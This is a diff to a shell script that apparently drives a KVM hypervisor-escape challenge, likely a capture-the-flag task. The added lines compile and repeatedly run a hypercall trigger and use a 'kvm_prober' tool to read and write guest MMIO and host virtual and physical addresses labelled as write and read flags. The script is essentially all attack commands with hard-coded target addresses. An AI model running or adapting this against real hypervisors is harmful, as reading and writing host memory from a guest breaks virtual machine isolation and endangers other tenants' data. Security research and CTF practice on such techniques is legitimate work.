@@ -109,9 +109,49 @@ Read flag VA: 0xffffffff83a58ae8
 Phys: 0x8c58ae8"
 
 sleep 2
-echo "host addresses  WITHOUT KASLR
-Write flag VA: 0xffffffff8304f080
-phys: 0x204f080
-Read flag VA: 0xffffffff83a58ae8
-Phys: 0x8c58ae8"
+echo "compiling hypercall..."
+gcc -static -o trigger_hypercall_100 trigger_hypercall_100.c
 
+sleep 2
+echo "triggering hypercall..."
+./trigger_hypercall_100
+
+sleep 2
+echo "reading write_flag address before write..."
+# Read to write flag (PA)
+kvm_prober readmmio_val 0x026279a8 0 8
+./trigger_hypercall_100
+
+sleep 2
+echo "writing to write_flag virtual address..."
+# Write to write flag (VA)
+kvm_prober pathinstr 0xffffffff8304f080 DEAD
+./trigger_hypercall_100
+
+sleep 2
+echo "reading write_flag physical address after virtual address write"
+# Read to write flag (PA)
+kvm_prober readmmio_val 0x026279a8 0 8
+./trigger_hypercall_100
+
+sleep 2
+echo "writing to write_flag address..."
+# Write to write flag (PA)
+kvm_prober writemmio_val 0x026279a8 0 8
+./trigger_hypercall_100
+
+sleep 2
+echo "reading write_flag address after write..."
+# Read to write flag (PA)
+kvm_prober readmmio_val 0x026279a8 0 8
+./trigger_hypercall_100
+
+sleep 2
+echo "reading readflag address..."
+# Read read flag (PA)
+kvm_prober readmmio_val 0x02b5ee10 8
+./trigger_hypercall_100
+
+sleep 2
+
+echo "all done"
